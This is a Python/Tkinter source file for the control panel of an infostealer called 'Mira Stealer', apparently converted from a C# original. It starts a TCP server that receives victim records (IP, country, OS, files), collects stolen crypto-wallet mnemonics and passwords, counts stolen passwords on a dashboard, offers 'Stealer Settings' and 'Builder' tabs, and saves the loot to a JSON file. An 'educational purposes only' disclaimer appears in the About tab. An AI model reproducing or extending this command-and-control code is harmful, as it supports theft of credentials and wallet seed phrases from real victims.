"""
Main Form
Converted from C# Form1.cs class
"""

import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import threading
import os
import json
from datetime import datetime
from .language_selector import LanguageState
from .translation_manager import TranslationManager
from .models import *
from .network_server import NetworkServer
from .live_chart import LiveChart
import webbrowser

class MainForm:
    """Main application window"""
    
    def __init__(self, parent, selected_language):
        self.parent = parent
        self.selected_language = selected_language
        LanguageState.set_language(selected_language)
        
        # Initialize data
        self.client_data = []
        self.mnemonic_data = []
        self.atomic_mnemonic_data = []
        self.credential_data = []
        self.wallet_data = []
        
        # Network server
        self.server = None
        
        # Statistics
        self.country_stats = CountryStats()
        self.wallet_stats = WalletStats()
        
        # UI Elements
        self.main_window = None
        self.notebook = None
        self.chart = None
        
        # Create the window
        self._create_window()
        
    def show(self):
        """Show the main window"""
        if self.main_window:
            self.main_window.deiconify()
    
    def _create_window(self):
        """Create the main window"""
        self.main_window = tk.Toplevel(self.parent)
        
        # Window properties
        title = TranslationManager.get_translation(self.selected_language, "window_title")
        if title is None:
            title = "Mira Stealer - Control Panel"
        self.main_window.title(title)
        
        # Set window size and position
        window_width = 1200
        window_height = 800
        screen_width = self.main_window.winfo_screenwidth()
        screen_height = self.main_window.winfo_screenheight()
        x = (screen_width - window_width) // 2
        y = (screen_height - window_height) // 2
        
        self.main_window.geometry(f"{window_width}x{window_height}+{x}+{y}")
        self.main_window.minsize(800, 600)
        
        # Configure style
        self._configure_style()
        
        # Create the main layout
        self._create_layout()
        
        # Handle window close
        self.main_window.protocol("WM_DELETE_WINDOW", self._on_window_close)
        
        # Load saved data
        self._load_data()
    
    def _configure_style(self):
        """Configure the visual style"""
        style = ttk.Style()
        
        # Configure colors similar to DevExpress dark theme
        bg_color = "#2C3E50"
        fg_color = "#ECF0F1"
        accent_color = "#3498DB"
        
        style.theme_use('clam')
        
        # Configure styles
        style.configure('Title.TLabel', 
                       font=('Segoe UI', 14, 'bold'), 
                       foreground=accent_color,
                       background=bg_color)
        
        style.configure('Stat.TLabel',
                       font=('Segoe UI', 12, 'bold'),
                       foreground=fg_color,
                       background=bg_color)
        
        style.configure('Button.TButton',
                       font=('Segoe UI', 9),
                       padding=6)
        
        # Configure the main window background
        self.main_window.configure(bg=bg_color)
    
    def _create_layout(self):
        """Create the main layout"""
        # Create main container
        main_container = tk.Frame(self.main_window, bg="#2C3E50")
        main_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Create left sidebar (navigation)
        self._create_sidebar(main_container)
        
        # Create main content area
        self._create_content_area(main_container)
    
    def _create_sidebar(self, parent):
        """Create the left sidebar navigation"""
        sidebar_frame = tk.Frame(parent, bg="#34495E", width=200)
        sidebar_frame.pack(side=tk.LEFT, fill=tk.Y, padx=(0, 10))
        sidebar_frame.pack_propagate(False)
        
        # Navigation buttons
        nav_buttons = [
            ("accordionControlElement1", "Dashboard", self._show_dashboard),
            ("accordionControlElement2", "Logs", self._show_logs),
            ("accordionControlElement3", "Stealer Settings", self._show_settings),
            ("accordionControlElement4", "About", self._show_about),
            ("accordionControlElement5", "Builder", self._show_builder),
        ]
        
        for key, default_text, command in nav_buttons:
            text = TranslationManager.get_translation(self.selected_language, key)
            if text is None:
                text = default_text
                
            btn = tk.Button(
                sidebar_frame,
                text=text,
                command=command,
                bg="#3498DB",
                fg="white",
                font=("Segoe UI", 10, "bold"),
                relief=tk.FLAT,
                anchor=tk.W,
                padx=15,
                pady=10
            )
            btn.pack(fill=tk.X, pady=2)
    
    def _create_content_area(self, parent):
        """Create the main content area"""
        content_frame = tk.Frame(parent, bg="#2C3E50")
        content_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
        
        # Create notebook for different tabs
        self.notebook = ttk.Notebook(content_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True)
        
        # Create tabs
        self._create_dashboard_tab()
        self._create_logs_tab()
        self._create_settings_tab()
        self._create_about_tab()
        self._create_builder_tab()
        
        # Show dashboard by default
        self.notebook.select(0)
    
    def _create_dashboard_tab(self):
        """Create the dashboard tab"""
        dashboard_frame = ttk.Frame(self.notebook)
        self.notebook.add(dashboard_frame, text="Dashboard")
        
        # Create dashboard content
        self._create_dashboard_content(dashboard_frame)
    
    def _create_dashboard_content(self, parent):
        """Create dashboard content"""
        # Top statistics panel
        stats_frame = tk.Frame(parent, bg="#34495E")
        stats_frame.pack(fill=tk.X, padx=10, pady=(10, 5))
        
        # Statistics cards
        self._create_stats_cards(stats_frame)
        
        # Server control panel
        server_frame = tk.Frame(parent, bg="#34495E")
        server_frame.pack(fill=tk.X, padx=10, pady=5)
        
        self._create_server_controls(server_frame)
        
        # Chart and data area
        data_frame = tk.Frame(parent, bg="#2C3E50")
        data_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Split into chart and client list
        chart_frame = tk.Frame(data_frame, bg="#34495E")
        chart_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        
        clients_frame = tk.Frame(data_frame, bg="#34495E", width=400)
        clients_frame.pack(side=tk.RIGHT, fill=tk.Y, padx=(5, 0))
        clients_frame.pack_propagate(False)
        
        # Create chart
        chart_label = tk.Label(chart_frame, text="Live Statistics Chart", 
                              bg="#34495E", fg="white", font=("Segoe UI", 12, "bold"))
        chart_label.pack(pady=10)
        
        self.chart = LiveChart(chart_frame)
        
        # Create client list
        self._create_client_list(clients_frame)
    
    def _create_stats_cards(self, parent):
        """Create statistics cards"""
        # Configure grid
        parent.grid_columnconfigure(0, weight=1)
        parent.grid_columnconfigure(1, weight=1)
        parent.grid_columnconfigure(2, weight=1)
        parent.grid_columnconfigure(3, weight=1)
        
        # Statistics data
        stats = [
            ("Total Logs", "label1", "total_logs"),
            ("This Week", "label6", "week_logs"),
            ("Last 30 Days", "label9", "month_logs"),
            ("Total Passwords", "label12", "total_passwords")
        ]
        
        self.stat_labels = {}
        
        for i, (default_text, key, stat_key) in enumerate(stats):
            # Get translated text
            text = TranslationManager.get_translation(self.selected_language, key)
            if text is None:
                text = default_text
            
            # Create card frame
            card_frame = tk.Frame(parent, bg="#3498DB", relief=tk.RAISED, bd=2)
            card_frame.grid(row=0, column=i, padx=5, pady=5, sticky="ew")
            
            # Title
            title_label = tk.Label(card_frame, text=text, 
                                 bg="#3498DB", fg="white", 
                                 font=("Segoe UI", 10, "bold"))
            title_label.pack(pady=(10, 5))
            
            # Value
            value_label = tk.Label(card_frame, text="0", 
                                 bg="#3498DB", fg="white", 
                                 font=("Segoe UI", 16, "bold"))
            value_label.pack(pady=(0, 10))
            
            self.stat_labels[stat_key] = value_label
    
    def _create_server_controls(self, parent):
        """Create server control panel"""
        # Title
        title = tk.Label(parent, text="Server Control", 
                        bg="#34495E", fg="white", 
                        font=("Segoe UI", 12, "bold"))
        title.pack(pady=10)
        
        # Controls frame
        controls_frame = tk.Frame(parent, bg="#34495E")
        controls_frame.pack(fill=tk.X, padx=20)
        
        # Port input
        port_frame = tk.Frame(controls_frame, bg="#34495E")
        port_frame.pack(side=tk.LEFT, padx=(0, 20))
        
        tk.Label(port_frame, text="Port:", bg="#34495E", fg="white").pack(side=tk.LEFT)
        
        self.port_var = tk.StringVar(value="8080")
        port_entry = tk.Entry(port_frame, textvariable=self.port_var, width=10)
        port_entry.pack(side=tk.LEFT, padx=(5, 0))
        
        # Start/Stop button
        self.server_button = tk.Button(
            controls_frame,
            text="Start Server",
            command=self._toggle_server,
            bg="#27AE60",
            fg="white",
            font=("Segoe UI", 10, "bold"),
            relief=tk.FLAT,
            padx=20
        )
        self.server_button.pack(side=tk.LEFT, padx=10)
        
        # Status label
        self.status_label = tk.Label(
            controls_frame,
            text="Server Stopped",
            bg="#34495E",
            fg="#E74C3C",
            font=("Segoe UI", 10, "bold")
        )
        self.status_label.pack(side=tk.LEFT, padx=20)
    
    def _create_client_list(self, parent):
        """Create client connections list"""
        # Title
        title = tk.Label(parent, text="Client Connections", 
                        bg="#34495E", fg="white", 
                        font=("Segoe UI", 12, "bold"))
        title.pack(pady=10)
        
        # Create treeview
        columns = ("IP", "Country", "OS", "Files")
        self.client_tree = ttk.Treeview(parent, columns=columns, show="tree headings", height=15)
        
        # Configure columns
        self.client_tree.column("#0", width=0, stretch=False)
        for col in columns:
            self.client_tree.column(col, width=80, anchor=tk.CENTER)
            self.client_tree.heading(col, text=col)
        
        # Scrollbar
        scrollbar = ttk.Scrollbar(parent, orient=tk.VERTICAL, command=self.client_tree.yview)
        self.client_tree.configure(yscrollcommand=scrollbar.set)
        
        # Pack
        self.client_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(10, 0))
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
    
    def _create_logs_tab(self):
        """Create the logs tab"""
        logs_frame = ttk.Frame(self.notebook)
        self.notebook.add(logs_frame, text="Logs")
        
        # Create detailed data grids here
        # This would contain the password lists, wallet data, etc.
        tk.Label(logs_frame, text="Logs and Data Analysis", 
                font=("Segoe UI", 14, "bold")).pack(pady=20)
    
    def _create_settings_tab(self):
        """Create the settings tab"""
        settings_frame = ttk.Frame(self.notebook)
        self.notebook.add(settings_frame, text="Settings")
        
        tk.Label(settings_frame, text="Stealer Settings", 
                font=("Segoe UI", 14, "bold")).pack(pady=20)
    
    def _create_about_tab(self):
        """Create the about tab"""
        about_frame = ttk.Frame(self.notebook)
        self.notebook.add(about_frame, text="About")
        
        # About content
        about_text = """
Mira Stealer - Python Edition

This software is provided exclusively for educational and ethical research purposes.

⚠️  DISCLAIMER ⚠️
- Do NOT use it on real targets or personal machines
- Do NOT deploy or distribute this code with malicious intent  
- Use only in isolated VMs or malware sandboxes

The author takes no responsibility for misuse or damages.
By using this software, you agree to use it legally and ethically,
in full compliance with local and international laws.

Original C# version converted to Python + Tkinter
"""
        
        text_widget = tk.Text(about_frame, wrap=tk.WORD, font=("Segoe UI", 10))
        text_widget.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        text_widget.insert(tk.END, about_text)
        text_widget.config(state=tk.DISABLED)
    
    def _create_builder_tab(self):
        """Create the builder tab"""
        builder_frame = ttk.Frame(self.notebook)
        self.notebook.add(builder_frame, text="Builder")
        
        tk.Label(builder_frame, text="Builder Configuration", 
                font=("Segoe UI", 14, "bold")).pack(pady=20)
    
    # Navigation methods
    def _show_dashboard(self):
        self.notebook.select(0)
    
    def _show_logs(self):
        self.notebook.select(1)
    
    def _show_settings(self):
        self.notebook.select(2)
    
    def _show_about(self):
        self.notebook.select(3)
    
    def _show_builder(self):
        self.notebook.select(4)
    
    # Server methods
    def _toggle_server(self):
        """Toggle server start/stop"""
        if self.server and self.server.is_running:
            self._stop_server()
        else:
            self._start_server()
    
    def _start_server(self):
        """Start the TCP server"""
        try:
            port = int(self.port_var.get())
            if port < 1 or port > 65535:
                messagebox.showerror("Error", "Port must be between 1 and 65535")
                return
            
            self.server = NetworkServer(port, self._on_client_data)
            
            if self.server.start():
                self.server_button.config(text="Stop Server", bg="#E74C3C")
                self.status_label.config(text=f"Server Running on Port {port}", fg="#27AE60")
                messagebox.showinfo("Success", f"Server started on port {port}")
            else:
                messagebox.showerror("Error", "Failed to start server")
                
        except ValueError:
            messagebox.showerror("Error", "Invalid port number")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to start server: {str(e)}")
    
    def _stop_server(self):
        """Stop the TCP server"""
        if self.server:
            self.server.stop()
            self.server = None
            
        self.server_button.config(text="Start Server", bg="#27AE60")
        self.status_label.config(text="Server Stopped", fg="#E74C3C")
        messagebox.showinfo("Info", "Server stopped")
    
    def _on_client_data(self, data):
        """Handle incoming client data"""
        if isinstance(data, ClientData):
            # Add to client list
            self.client_data.append(data)
            
            # Update UI on main thread
            self.main_window.after_idle(self._update_client_list)
            self.main_window.after_idle(self._update_statistics)
            
        elif isinstance(data, dict) and data.get('type') == 'mnemonic':
            # Handle mnemonic data
            if data.get('mnemonic_type') == 'regular':
                mnemonic_data = MnemonicData(
                    mnemonic=data.get('mnemonic', ''),
                    password=data.get('password', '')
                )
                self.mnemonic_data.append(mnemonic_data)
            elif data.get('mnemonic_type') == 'atomic':
                atomic_data = AtomicMnemonicData(
                    atomic_mnemonic=data.get('mnemonic', ''),
                    atomic_password=data.get('password', '')
                )
                self.atomic_mnemonic_data.append(atomic_data)
    
    def _update_client_list(self):
        """Update the client connections list"""
        # Clear existing items
        for item in self.client_tree.get_children():
            self.client_tree.delete(item)
        
        # Add current clients
        for i, client in enumerate(self.client_data):
            self.client_tree.insert("", tk.END, values=(
                client.ip,
                client.country,
                client.os,
                f"{client.file_size} bytes" if client.file_size != "0" else "No files"
            ))
    
    def _update_statistics(self):
        """Update statistics display"""
        if hasattr(self, 'stat_labels'):
            total_logs = len(self.client_data)
            total_passwords = len(self.credential_data)
            
            self.stat_labels["total_logs"].config(text=str(total_logs))
            self.stat_labels["total_passwords"].config(text=str(total_passwords))
            # For now, use same values for week and month
            self.stat_labels["week_logs"].config(text=str(total_logs))
            self.stat_labels["month_logs"].config(text=str(total_logs))
    
    def _load_data(self):
        """Load saved data from files"""
        try:
            # Load client data if exists
            if os.path.exists("ClientData.json"):
                with open("ClientData.json", 'r') as f:
                    data = json.load(f)
                    for item in data.get('clients', []):
                        client = ClientData(**item)
                        self.client_data.append(client)
                
                self._update_client_list()
                self._update_statistics()
        except Exception as e:
            print(f"Error loading data: {e}")
    
    def _save_data(self):
        """Save data to files"""
        try:
            data = {
                'clients': [client.__dict__ for client in self.client_data],
                'mnemonics': [m.__dict__ for m in self.mnemonic_data],
                'atomic_mnemonics': [a.__dict__ for a in self.atomic_mnemonic_data],
                'credentials': [c.__dict__ for c in self.credential_data]
            }
            
            with open("ClientData.json", 'w') as f:
                json.dump(data, f, default=str, indent=2)
                
        except Exception as e:
            print(f"Error saving data: {e}")
    
    def _on_window_close(self):
        """Handle window close event"""
        # Stop server if running
        if self.server and self.server.is_running:
            self.server.stop()
        
        # Stop chart updates
        if self.chart:
            self.chart.destroy()
        
        # Save data
        self._save_data()
        
        # Close window
        self.main_window.destroy()
        self.parent.quit()